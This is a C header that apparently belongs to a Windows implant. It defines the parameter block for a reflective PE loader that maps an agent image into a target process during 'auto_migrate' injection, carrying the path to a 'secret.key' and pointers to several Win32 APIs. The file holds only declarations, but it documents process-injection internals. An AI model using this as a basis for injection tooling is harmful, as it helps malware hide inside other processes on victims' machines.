/*
 * client/loader.h — RflData structure shared between loader.c and inject.c
 */
#pragma once
#ifndef CLIENT_LOADER_H
#define CLIENT_LOADER_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>

/*
 * RflData — passed as the thread argument to the reflective loader.
 * All fields are filled by auto_migrate() before injection.
 */
#pragma pack(push,1)
typedef struct _RflData {
    /* Raw PE bytes (read from disk, written into the target allocation) */
    unsigned char *pRawPE;
    unsigned int   rawSize;

    /* RVA of AgentRun() within the PE image */
    unsigned int   agentRunRva;

    /* Offset and size of g_key_path in the image's .data section */
    unsigned int   gKeyPathOffset;  /* RVA of g_key_path[]              */
    unsigned int   gKeyPathSize;    /* sizeof(g_key_path) = MAX_PATH*2  */

    /* Absolute path to secret.key — copied into g_key_path after mapping */
    char           keyPath[MAX_PATH * 2];

    /* Win32 API pointers (resolved in our process, same VA in target) */
    LPVOID  (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    BOOL    (WINAPI *pFlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
    HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
    FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
    HANDLE  (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                    LPTHREAD_START_ROUTINE, LPVOID,
                                    DWORD, LPDWORD);
    BOOL    (WINAPI *pCloseHandle)(HANDLE);
} RflData;
#pragma pack(pop)

/* The loader function itself — exported for size measurement */
DWORD WINAPI rfl_loader(RflData *pData);
void         rfl_loader_end(void);

#endif /* CLIENT_LOADER_H */
